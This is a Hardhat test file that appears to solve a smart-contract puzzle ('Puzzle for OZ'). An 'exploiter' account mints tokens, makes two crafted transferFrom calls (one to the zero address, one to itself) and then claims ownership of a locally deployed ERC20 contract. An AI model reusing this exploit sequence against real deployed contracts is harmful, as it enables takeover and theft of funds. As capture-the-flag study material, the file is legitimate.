import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { Contract, constants } from "ethers";
import { ethers } from "hardhat";

describe("Puzzle for OZ", () => {
  // The deployer contract
  let Puzzle: Contract;

  // The signers of the test
  let deployer: SignerWithAddress;
  let exploiter: SignerWithAddress;

  before(async () => {
    [deployer, exploiter] = await ethers.getSigners();
    const Factory = await ethers.getContractFactory("ERC20", deployer);
    Puzzle = await Factory.deploy("ERC20", "ERC20");
  });

  it("should solve the puzzzle", async () => {
    let ownership = await Puzzle.owner();
    console.log("Current Owner: ", ownership);

    const totalSupplyBefore = await Puzzle.balanceOf(exploiter.address);
    console.log("Total supply before: ", totalSupplyBefore.toString());

    let tx = await Puzzle.connect(exploiter).publicMint();
    await tx.wait();

    let totalSupplyAfter = await Puzzle.balanceOf(exploiter.address);
    console.log(
      "Total supply after public mint: ",
      totalSupplyAfter.toString(),
    );

    tx = await Puzzle.connect(exploiter).transferFrom(
      exploiter.address,
      constants.AddressZero,
      ethers.utils.parseEther("0.5"),
    );
    await tx.wait();

    totalSupplyAfter = await Puzzle.balanceOf(exploiter.address);
    console.log(
      "Total supply after transferFrom: ",
      totalSupplyAfter.toString(),
    );

    tx = await Puzzle.connect(exploiter).transferFrom(
      exploiter.address,
      exploiter.address,
      ethers.utils.parseEther("0.5"),
    );
    await tx.wait();

    totalSupplyAfter = await Puzzle.balanceOf(exploiter.address);
    console.log(
      "Total supply after transferFrom: ",
      totalSupplyAfter.toString(),
    );

    tx = await Puzzle.connect(exploiter).claimOwnership();
    await tx.wait();

    ownership = await Puzzle.owner();
    console.log("Current Owner: ", ownership);
  });
});
